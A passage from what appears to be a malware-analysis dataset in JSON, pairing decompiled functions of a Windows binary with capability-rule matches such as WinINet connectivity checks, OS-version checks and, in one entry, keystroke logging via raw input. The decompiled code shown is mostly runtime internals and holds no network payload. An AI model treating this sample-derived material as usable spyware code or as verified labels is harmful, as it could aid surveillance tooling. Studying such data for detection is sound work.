fcn.00406810();\n            fcn.00406810();\n            fcn.00406810();\n            fcn.0043acb1();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4467
    },
    "0043a5f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043a5f3(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x495734 == '\\0') {\n        if ((arg_8h != 0) && (arg_8h != 1)) {\n            fcn.0043b221(5);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        iVar3 = fcn.0043b215();\n        if ((iVar3 == 0) || (arg_8h != 0)) {\n            uVar2 = 0x20 - (*0x49106c & 0x1f) & 0x1f;\n            *0x49571c = (0xffffffffU >> uVar2 | -1 << 0x20 - uVar2) ^ *0x49106c;\n            *0x495720 = *0x49571c;\n            *0x495724 = *0x49571c;\n            *0x495728 = *0x49571c;\n            *0x49572c = *0x49571c;\n            *0x495730 = *0x49571c;\n        }\n        else {\n            iVar3 = fcn.0045f6de(0x49571c);\n            if ((iVar3 != 0) || (iVar3 = fcn.0045f6de(0x495728),  iVar3 != 0)) {\n                return 0;\n            }\n        }\n        *0x495734 = '\\x01';\n    }\n    return 1;\n}\n",
        "token_count": 401
    },
    "0043b7f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b7f5(uint32_t **param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t **ppuVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47313c;\n    var_ch = *in_FS_OFFSET;\n    uVar4 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0043cd0a(uVar4);\n    ppuVar5 = *param_1;\n    if (0x1 < *param_1) {\n        do {\n            puVar1 = *ppuVar5;\n            pcVar2 = **ppuVar5[1];\n            (**0x4742a4)(0, ppuVar5);\n            cVar3 = (*pcVar2)();\n            if (cVar3 != '\\0') {\n                pcVar2 = *(*ppuVar5[1] + 8);\n                (**0x4742a4)();\n                (*pcVar2)();\n            }\n            ppuVar5 = puVar1;\n        } while (puVar1 != NULL);\n    }\n    ppuVar5 = param_1[1];\n    while (ppuVar5 != NULL) {\n        puVar1 = *ppuVar5;\n        pcVar2 = *(*ppuVar5[1] + 8);\n        (**0x4742a4)();\n        (*pcVar2)();\n        ppuVar5 = puVar1;\n    }\n    fcn.004264ce();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 426
    },
    "0043bd27": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __cdecl fcn.0043bd27(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    int32_t **ppiVar3;\n    code *pcVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    ppiVar3 = NULL;\n    if (arg_8h != NULL) {\n        do {\n            ppiVar1 = *arg_8h;\n            if (arg_ch == '\\0') {\n                pcVar4 = *(*arg_8h[1] + 0x10);\n            }\n            else {\n                pcVar4 = *(*arg_8h[1] + 0xc);\n            }\n            (**0x4742a4)();\n            cVar2 = (*pcVar4)();\n            if (cVar2 != '\\0') {\n                *arg_8h = ppiVar3;\n                ppiVar3 = arg_8h;\n            }\n            arg_8h = ppiVar1;\n        } while (ppiVar1 != NULL);\n    }\n    return ppiVar3;\n}\n",
        "token_count": 248
    },
    "0043c1bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043c1bf(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t **ppuVar2;\n    code *pcVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x40;\n    var_4h = 0x43c1cb;\n    fcn.0043ad07();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *(unaff_EBP + -0x30) = vtable.Concurrency::details::_MallocaArrayHolder_class_Concurrency::Context__.0;\n    iVar8 = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    iVar7 = 0;\n    *(unaff_EBP + -0x28) = 0;\n    var_4h = extraout_ECX + 8;\n    *(unaff_EBP + -4) = 0;\n    puVar6 = &fcn.0043c1bf::var_4h;\n    fcn.0043c95e(var_4h);\n    *(unaff_EBP + -4) = 1;\n    puVar1 = **(unaff_EBP + -0x18);\n    **(unaff_EBP + -0x18) = 0x1;\n    *(unaff_EBP + -0x1c) = puVar1;\n    if (puVar1 < 0x2) goto code_r0x0043c2bb;\n    iVar8 = 0;\n    for (ppuVar2 = puVar1; ppuVar2 != NULL; ppuVar2 = *ppuVar2) {\n        iVar8 = iVar8 + 1;\n    }\n    uVar5 = iVar8 * 4 + 8;\n    uVar5 = -(iVar8 * 4 < uVar5) & uVar5;\n    if (uVar5 == 0) {\n        puVar6 = NULL;\n    }\n    else if (uVar5 < 0x401) {\n        fcn.0043adb0();\n        if (*0x10 != 0x8) {\n            var_4h = 0xcccc;\n            puVar6 = &fcn.0043c1bf::var_4h;\ncode_r0x0043c257:\n            puVar6 = puVar6 + 2;\n        }\n    }\n    else {\n        puVar6 = fcn.00455a3e(uVar5);\n        if (puVar6 != NULL) {\n            *puVar6 = 0xdddd;\n            goto code_r0x0043c257;\n        }\n    }\n    iVar8 = fcn.0043be4e(puVar6);\n    iVar7 = 0;\n    *(unaff_EBP + -0x14) = iVar8;\n    while (puVar1 != NULL) {\n        puVar6 = puVar1[1];\n        *(unaff_EBP + -0x24) = *puVar1;\n        pcVar3 = **puVar6;\n        (**0x4742a4)(unaff_EBP + -0x20, puVar1);\n        cVar4 = (*pcVar3)();\n        if (cVar4 != '\\0') {\n            iVar8 = *(unaff_EBP + -0x18);\n            puVar6 = *(unaff_EBP + -0x1c);\n            *puVar6 = *(iVar8 + 4);\n            *(iVar8 + 4) = puVar6;\n        }\n        iVar8 = *(unaff_EBP + -0x14);\n        if (*(unaff_EBP + -0x20) != 0) {\n            *(iVar8 + iVar7 * 4) = *(unaff_EBP + -0x20);\n            iVar7 = iVar7 + 1;\n        }\n        puVar1 = *(unaff_EBP + -0x24);\n        *(unaff_EBP + -0x1c) = puVar1;\n    }\ncode_r0x0043c2bb:\n    *(unaff_EBP + -4) = 0;\n    fcn.0043c990();\n    while (iVar7 != 0) {\n        iVar7 = iVar7 + -1;\n        pcVar3 = *(**(iVar8 + iVar7 * 4) + 0xc);\n        (**0x4742a4)();\n        (*pcVar3)();\n        iVar8 = *(unaff_EBP + -0x14);\n    }\n    fcn.004399f5(*(unaff_EBP + -0x2c));\n    *(unaff_EBP + -0x60) = 0x43c2f6;\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 1215
    },
    "0043c35b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0043c35b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_54h;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x48);\n    iVar4 = *(unaff_EBP + 8);\n    if (iVar4 == -1) {\n        *(unaff_EBP + -0x2c) = 0x43d8bf;\n        *(unaff_EBP + -0x10) = 0;\n        *(unaff_EBP + -0x30) = 0;\n        do {\n            if (*extraout_ECX == 1) goto code_r0x0043c434;\n            cVar2 = fcn.0043bf45();\n        } while (cVar2 != '\\0');\n        fcn.0043b717();\n        *(unaff_EBP + -0x28) = 0x47822c;\n        *(unaff_EBP + -0x18) = unaff_EBP + -0x28;\n        fcn.0043c95e(extraout_ECX + 2);\n        *(unaff_EBP + -4) = 0;\n        if (*extraout_ECX == 1) {\n            *(unaff_EBP + -0x10) = 1;\n        }\n        else {\n            uVar3 = fcn.0043bd27(*extraout_ECX, 1);\n            *(unaff_EBP + -0x1c) = uVar3;\n            *extraout_ECX = unaff_EBP + -0x1c;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0043c990();\n        if ((*(unaff_EBP + -0x10) == '\\0') && (*(unaff_EBP + -0x20) != 1)) {\n            piVar1 = unaff_EBP + -0x20;\n            iVar4 = 0;\n            LOCK();\n            if (*piVar1 == 0) {\n                *piVar1 = 2;\n            }\n            else {\n                iVar4 = *piVar1;\n            }\n            if (iVar4 != 1) {\n                fcn.0043d8e6();\n            }\n        }\n    }\n    else if (iVar4 != 0) {\n        *(unaff_EBP + -0x14) = extraout_ECX;\n        fcn.0043c524(unaff_EBP + -0x14, 1, 1, iVar4);\n    }\ncode_r0x0043c434:\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 717
    },
    "0043c524": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0043c524(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t arg_ch_00;\n    uint *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    unkuint3 Var8;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar9;\n    int32_t unaff_EBP;\n    uint *puVar10;\n    uint var_98h;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_58h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint uVar11;\n    uint Flags;\n    uint var_4h;\n    \n    fcn.0043acd3(0x8c);\n    piVar9 = *(unaff_EBP + 8);\n    if (piVar9 == NULL) {\n        fcn.00425638(\"pEvents\");\n        uVar11 = 0x48c934;\n        iVar7 = unaff_EBP + -0x4c;\n        goto code_r0x0043c835;\n    }\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    if (arg_ch_00 == 0) goto code_r0x0043c81a;\n    iVar7 = *(unaff_EBP + 0x14);\n    if ((arg_ch_00 == 1) && ((iVar7 == 0 || (iVar7 == -1)))) {\n        if (*piVar9 == 0) {\n            fcn.00425638(\"pEvents\");\n            uVar11 = 0x48c934;\n            iVar7 = unaff_EBP + -0x58;\n            goto code_r0x0043c835;\n        }\n        fcn.0043c35b(iVar7);\n        goto code_r0x0043c81a;\n    }\n    uVar4 = 0;\n    if (arg_ch_00 != 0) {\n        do {\n            if (piVar9[uVar4] == 0) {\n                fcn.00425638(\"pEvents\");\n                uVar11 = 0x48c934;\n                iVar7 = unaff_EBP + -100;\n                goto code_r0x0043c835;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < arg_ch_00);\n    }\n    Var8 = uVar4 >> 8;\n    if ((iVar7 == 0) || (iVar7 == -1)) {\n        iVar5 = Var8 << 8;\n    }\n    else {\n        iVar5 = CONCAT31(Var8, 1);\n    }\n    fcn.0043b639(*(unaff_EBP + 0x10), arg_ch_00, iVar7 != -1, iVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar4 = 0;\n    *(unaff_EBP + -0xd) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    if (arg_ch_00 != 0) {\n        puVar10 = *(unaff_EBP + -0x34) + *(unaff_EBP + -0x40);\n        *(unaff_EBP + -0x20) = puVar10;\n        while( true ) {\n            iVar5 = *(*(unaff_EBP + 8) + uVar4 * 4);\n            *(unaff_EBP + -0x18) = iVar5;\n            fcn.0043c95e(iVar5 + 8);\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 1;\n            *(unaff_EBP + -4) = 1;\n            if (**(unaff_EBP + -0x18) == 1) break;\n            uVar11 = fcn.0043bd27(**(unaff_EBP + -0x18), 1);\n            *puVar10 = uVar11;\n            **(unaff_EBP + -0x18) = puVar10;\ncode_r0x0043c683:\n            *(unaff_EBP + -4) = 0;\n            fcn.0043c990();\n            puVar10 = puVar10 + *(unaff_EBP + -0x3c);\n            uVar4 = *(unaff_EBP + -0x24) + 1;\n            *(unaff_EBP + -0x24) = uVar4;\n            *(unaff_EBP + -0x20) = puVar10;\n            if (arg_ch_00 <= uVar4) goto code_r0x0043c715;\n        }\n        puVar1 = puVar10[1];\n        *(unaff_EBP + -0x14) = puVar1;\n        pcVar2 = **puVar1;\n        (**0x4742a4)(unaff_EBP + -0x1c, puVar10);\n        if (*(unaff_EBP + 0x10) != '\\0') {\n            cVar3 = (*pcVar2)();\n            if (cVar3 == '\\0') {\n                puVar10 = *(unaff_EBP + -0x20);\n            }\n            else {\n                uVar11 = fcn.0043bd27(*(*(unaff_EBP + -0x18) + 4), 0);\n                puVar10 = *(unaff_EBP + -0x20);\n                *puVar10 = uVar11;\n                *(*(unaff_EBP + -0x18) + 4) = puVar10;\n            }\n            if (*(unaff_EBP + -0x1c) != 0) {\n                *(unaff_EBP + -0xd) = 1;\n            }\n            goto code_r0x0043c683;\n        }\n        (*pcVar2)();\n        if (*(unaff_EBP + -0x1c) != 0) {\n            *(unaff_EBP + -0xd) = 1;\n        }\n        uVar4 = *(unaff_EBP + -0x24) + 1;\n        if (uVar4 < arg_ch_00) {\n            puVar10 = *(unaff_EBP + -0x40) + 4 + *(unaff_EBP + -0x3c) * uVar4 + *(unaff_EBP + -0x34);\n            iVar7 = arg_ch_00 - uVar4;\n            *(unaff_EBP + -0x14) = puVar10;\n            *(unaff_EBP + 0xc) = iVar7;\n            do {\n                puVar1 = *puVar10;\n                *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 1;\n                pcVar2 = **puVar1;\n                (**0x4742a4)(unaff_EBP + -0x1c, puVar10 + -1);\n                (*pcVar2)();\n                puVar10 = *(unaff_EBP + -0x14) + *(unaff_EBP + -0x3c);\n                *(unaff_EBP + -0x14) = puVar10;\n                iVar7 = iVar7 + -1;\n            } while (iVar7 != 0);\n            iVar7 = *(unaff_EBP + 0x14);\n        }\n        *(unaff_EBP + -4) = 0;\n        fcn.0043c990();\ncode_r0x0043c715:\n        if (*(unaff_EBP + -0xd) == '\\0') goto code_r0x0043c722;\n        goto code_r0x0043c7f7;\n    }\ncode_r0x0043c722:\n    piVar9 = *(unaff_EBP + -0x30) + 8;\n    if (*piVar9 != 1) {\n        iVar5 = 0;\n        LOCK();\n        if (*piVar9 == 0) {\n            *piVar9 = 2;\n        }\n        else {\n            iVar5 = *piVar9;\n        }\n        if (iVar5 != 1) {\n            if (iVar7 == 0) {\n                iVar7 = *(unaff_EBP + -0x30);\n                LOCK();\n                piVar9 = iVar7 + 0x14;\n                iVar5 = *piVar9;\n                *piVar9 = *piVar9 + 1;\n                if (iVar5 == 0) {\n                    *(iVar7 + 0xc) = 0;\n                    *(iVar7 + 0x29) = 1;\n                    goto code_r0x0043c7f7;\n                }\n            }\n            else if ((iVar7 != -1) && (*(*(unaff_EBP + -0x30) + 0x14) == 0)) {\n                iVar6 = fcn.0043f944();\n                iVar5 = *(unaff_EBP + -0x30);\n                if (iVar6 < 3) {\n                    Flags = 0x20;\n                    uVar11 = fcn.0043ba0a();\n                    iVar7 = fcn.0043d122(iVar5 + 0x10, uVar11, fcn.0043b990, iVar5, iVar7, 0, Flags);\n                    if (iVar7 == 0) {\n                        fcn.004255d9();\n                        uVar11 = 0x48c8fc;\n                        iVar7 = unaff_EBP + -0x7c;\n                        goto code_r0x0043c835;\n                    }\n                }\n                else {\n                    iVar7 = fcn.0043d73e(iVar7, fcn.0043b8fd, iVar5, 0);\n                    *(iVar5 + 0x10) = iVar7;\n                    if (iVar7 == 0) {\n                        fcn.004255d9();\n                        uVar11 = 0x48c8fc;\n                        iVar7 = unaff_EBP + -0x70;\ncode_r0x0043c835:\n                        fcn.00451487(iVar7, uVar11);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 1;\n            }\n            fcn.0043d8e6();\n        }\n    }\ncode_r0x0043c7f7:\n    fcn.0043b789();\ncode_r0x0043c81a:\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 2543
    },
    "0043cc57": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043cc57(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t *arg_8h_00;\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t *in_ECX;\n    uint var_ch;\n    \n    if (*arg_8h != *in_ECX) {\n        arg_8h_00 = in_ECX[7];\n        in_ECX[7] = arg_8h;\n        if (arg_8h_00 == NULL) {\n            in_ECX[6] = arg_8h;\n            fcn.0043cb5a(in_ECX);\n            arg_8h[2] = arg_8h[2] & 0xfffffffe;\n            uVar2 = fcn.0043cb03();\n        }\n        else {\n            fcn.0043cb5a(arg_8h_00);\n            arg_8h_00[1] = arg_8h;\n            uVar2 = fcn.0043c9c8(in_ECX[2]);\n            if (arg_8h[4] != 2) {\n                uVar2 = fcn.0043cb5a(in_ECX);\n            }\n        }\n        if (arg_ch != '\\0') {\n            in_ECX[2] = arg_8h[2];\n            in_ECX[1] = arg_8h[1];\n            uVar2 = *arg_8h;\n            *in_ECX = uVar2;\n            in_ECX[6] = arg_8h;\n        }\n        return uVar2 & 0xffffff00 | arg_8h[4] != 2;\n    }\n    fcn.004454c2(\"Lock already taken\");\n    fcn.00451487(&var_ch, 0x48de34);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 435
    },
    "0043d89a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043d89a(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    fcn.0044646e();\n    if (*param_1 == 0) {\n        uVar2 = 1;\n        uVar1 = *param_1;\n        *param_1 = 1;\n        if (uVar1 == 0) goto code_r0x0043d8ba;\n    }\n    uVar2 = 0;\n    uVar1 = fcn.0044646e();\ncode_r0x0043d8ba:\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 157
    },
    "0043e77d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __fastcall fcn.0043e77d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint arg_8h;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*(param_1 + 100) == 0) {\n        bVar12 = true;\n    }\n    else {\n        if (*(param_1 + 100) == 0) {\n            iVar11 = 0;\n        }\n        else {\n            iVar11 = *(*(param_1 + 100) + 0x18);\n        }\n        uVar4 = fcn.0043e381();\n        if ((*(iVar11 + 0xa0) < uVar4) || (*(iVar11 + 0xa8) != 0)) {\n            arg_8h = fcn.0043e381();\n            var_ch = fcn.004483ee(arg_8h);\n            var_ch = var_ch - *(iVar11 + 0xa0);\n            iVar8 = *(iVar11 + 0x10);\n            iVar1 = *(iVar11 + 0x14);\n            iVar5 = fcn.0043e381();\n            bVar12 = iVar5 != *(param_1 + 0x1c);\n            uVar4 = *(param_1 + 0x18);\n            var_18h = 0;\n            if (uVar4 != 0) {\n                do {\n                    bVar12 = bVar12 & var_ch != 0;\n                    if (bVar12) {\n                        uVar9 = var_18h + 1;\n                        iVar5 = *(iVar1 + var_18h * 4);\n                        iVar6 = iVar5 * 0x34 + iVar8;\n                        uVar10 = var_18h;\n                        if (uVar9 < uVar4) {\n                            do {\n                                iVar7 = *(iVar1 + uVar9 * 4) * 0x34 + iVar8;\n                                uVar2 = *(iVar7 + 0x1c);\n                                if (*(iVar6 + 0x1c) <= uVar2 && uVar2 != *(iVar6 + 0x1c)) {\n                                    iVar6 = iVar7;\n                                    uVar10 = uVar9;\n                                }\n                                uVar9 = uVar9 + 1;\n                            } while (uVar9 < uVar4);\n                            if (var_18h != uVar10) {\n                                *(iVar1 + var_18h * 4) = *(iVar1 + uVar10 * 4);\n                                *(iVar1 + uVar10 * 4) = iVar5;\n                            }\n                        }\n                    }\n                    iVar5 = *(iVar1 + var_18h * 4) * 0x34 + iVar8;\n                    if (*(iVar5 + 4) != 0) {\n                        uVar4 = 0;\n                        var_10h = 0;\n                        do {\n                            iVar6 = *(iVar5 + 0x30);\n                            if (*(iVar6 + var_10h) == 1) {\n                                if (var_ch != 0) {\n                                    piVar3 = *(iVar6 + 0x14 + var_10h);\n                                    *piVar3 = *piVar3 + 1;\n                                    fcn.004481e2(iVar5, uVar4, 0);\n                                    var_ch = var_ch + -1;\n                                }\n                            }\n                            else if (*(iVar6 + 0x31 + var_10h) != '\\0') {\n                                fcn.00449036(iVar5, uVar4);\n                            }\n                            uVar4 = uVar4 + 1;\n                            var_10h = var_10h + 0x34;\n                        } while (uVar4 < *(iVar5 + 4));\n                    }\n                    uVar4 = *(param_1 + 0x18);\n                    var_18h = var_18h + 1;\n                } while (var_18h < uVar4);\n            }\n        }\n        if (*(iVar11 + 0x84) == *(iVar11 + 0x80)) {\n            fcn.004413ff(0);\n        }\n        iVar8 = fcn.0043e381();\n        bVar12 = *(iVar11 + 0xa0) == iVar8;\n    }\n    return bVar12;\n}\n",
        "token_count": 1099
    },
    "0043ebf4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ebf4(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.004402e9();\n    fcn.004403fd();\n    uVar5 = 0;\n    iVar9 = 0;\n    uVar4 = 0;\n    var_ch = 0;\n    var_14h = 0;\n    if (*(param_1 + 8) != 0) {\n        do {\n            iVar7 = *(*(param_1 + 0x54) + uVar4 * 4);\n            uVar10 = *(*(iVar7 + 0x10) + 0xa0);\n            if (*(iVar7 + 0x24) <= uVar10 && uVar10 != *(iVar7 + 0x24)) {\n                *(*(param_1 + 0x58) + iVar9 * 4) = iVar7;\n                iVar9 = iVar9 + 1;\n                iVar8 = *(iVar7 + 0x10);\n                uVar10 = *(iVar8 + 0xa0) - *(iVar7 + 0x24);\n                uVar5 = uVar5 + uVar10;\n                if (*(iVar7 + 0x18) < uVar10) {\n                    uVar10 = *(iVar7 + 0x18);\n                }\n                *(iVar7 + 0x28) = uVar10;\n                uVar6 = *(iVar8 + 0xa8) - *(iVar7 + 0x18);\n                uVar1 = (*(iVar8 + 0xa0) - *(iVar7 + 0x24)) - uVar10;\n                if (uVar1 <= uVar6) {\n                    uVar6 = uVar1;\n                }\n                *(iVar7 + 0x2c) = uVar6;\n                *(iVar7 + 0x30) = ((*(*(iVar7 + 0x10) + 0xa0) - *(iVar7 + 0x24)) - uVar6) - uVar10;\n                var_14h = iVar9;\n                var_ch = uVar5;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < *(param_1 + 8));\n    }\n    uVar4 = 0;\n    *(param_1 + 0x20) = 0;\n    var_4h = 0;\n    var_10h = 0;\n    if (*(param_1 + 0x18) != 0) {\n        var_8h = 0;\n        do {\n            iVar9 = *(param_1 + 0x48) + var_8h;\n            if (*(iVar9 + 4) != 0) {\n                uVar5 = 0;\n                iVar7 = 0;\n                do {\n                    puVar3 = *(iVar9 + 0x20) + iVar7;\n                    if (puVar3[4] == 0) {\n                        *puVar3 = 2;\n                        *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                        var_4h = var_4h + 1;\n                    }\n                    else if (puVar3[4] == puVar3[7]) {\n                        *puVar3 = 6;\n                        *(iVar9 + 0x1c) = *(iVar9 + 0x1c) + 1;\n                        *(param_1 + 0x20) = *(param_1 + 0x20) + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                    iVar7 = iVar7 + 0x24;\n                    uVar4 = var_4h;\n                } while (uVar5 < *(iVar9 + 4));\n            }\n            var_10h = var_10h + 1;\n            var_8h = var_8h + 0x28;\n        } while (var_10h < *(param_1 + 0x18));\n    }\n    *(param_1 + 0x24) = 0;\n    iVar9 = var_ch + uVar4;\n    uVar4 = 0;\n    var_8h = iVar9;\n    while (((iVar9 != 0 || (*(param_1 + 0x20) != 0)) && (uVar4 < 2))) {\n        if (uVar4 == 1) {\n            fcn.0043fbf2();\n        }\n        iVar7 = 0;\n        iVar8 = 0;\n        uVar4 = 0;\n        var_10h = 0;\n        if (*(param_1 + 8) != 0) {\n            do {\n                iVar9 = *(*(param_1 + 0x54) + uVar4 * 4);\n                if (*(*(iVar9 + 0x10) + 0xa0) < *(iVar9 + 0x24)) {\n                    *(*(param_1 + 0x5c) + iVar7 * 4) = iVar9;\n                    iVar7 = iVar7 + 1;\n                    iVar8 = iVar8 + (*(iVar9 + 0x24) - *(*(iVar9 + 0x10) + 0xa0));\n                    var_10h = iVar7;\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < *(param_1 + 8));\n            iVar9 = var_8h;\n            if (iVar7 != 0) {\n                if (var_8h != 0) {\n                    uVar10 = fcn.0043dc90(var_8h, iVar8, iVar7);\n                    uVar2 = fcn.004404f5(var_10h);\n                    uVar4 = 0;\n                    uVar5 = var_4h;\n                    if (uVar10 <= var_4h) {\n                        uVar5 = uVar10;\n                    }\n                    var_4h = var_4h - uVar5;\n                    if (uVar5 < uVar10) {\n                        uVar4 = uVar10 - uVar5;\n                        if (var_ch <= uVar10 - uVar5) {\n                            uVar4 = var_ch;\n                        }\n                        var_ch = var_ch - 